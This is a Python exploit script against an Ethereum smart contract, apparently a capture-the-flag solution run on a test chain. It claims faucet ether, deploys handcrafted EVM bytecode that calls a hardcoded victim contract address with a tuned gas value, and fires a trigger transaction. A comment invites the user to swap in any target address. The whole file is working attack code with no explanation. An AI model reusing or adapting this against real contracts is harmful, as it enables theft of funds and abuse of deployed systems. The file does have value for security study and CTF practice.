#!/usr/bin/python3

from web3 import Web3
import requests, time

SERVER_IP  = '111.111.111.111'    # change this
GETH_PORT  = '8545'
FAUCET_PORT = '8080'
victim = '0x2655d159556d016e2A1cd7C5370b01A391165f7e'   # just change this to target address

w3 = Web3(Web3.HTTPProvider(f'http://{SERVER_IP}:{GETH_PORT}')) 
assert w3.isConnected()

acc = w3.eth.account.create()
hacker, sk_hacker = acc.address, acc.key
MIN_GAS = '0192fe'

print('[+] hacker:', hacker)
assert requests.post(f'http://{SERVER_IP}:{FAUCET_PORT}/api/claim', data = {'address': hacker}).status_code == 200
print('[+] waiting for test ether')
while w3.eth.get_balance(hacker) == 0:
    time.sleep(5)
print('[+] exploit start')

def get_txn(src, dst, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "to": dst,
        "gasPrice": w3.toWei(1,'wei'),
        "gas": 4700000,
        "value": w3.toWei(value,'wei'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
    }

def deploy(src, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "gasPrice": w3.toWei(1,'wei'),
        "gas": 4700000,
        "value": w3.toWei(value,'wei'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
    }

bytecode = '6080604052348015600f57600080fd5b5060006040518060800160405280605781526020016035605791399050805160208201f3fe5a6201869e36600010602457146015576002601b565b6001601b565b60005260206000f35b600063890d69088152806004601c8273'
bytecode += victim[2:]
bytecode += f'62{MIN_GAS}f1600114605557fd5b00'


signed_txn = w3.eth.account.signTransaction(deploy(hacker, bytecode), sk_hacker)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
assert txn_receipt['status'] == 1
target = txn_receipt['contractAddress']
print('[+] attacker address:', target)

data = b'\x11'
signed_txn = w3.eth.account.signTransaction(get_txn(hacker, target, data), sk_hacker)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
assert txn_receipt['status'] == 1
print('[+] exploited, tx_hash:', txn_receipt['transactionHash'].hex())
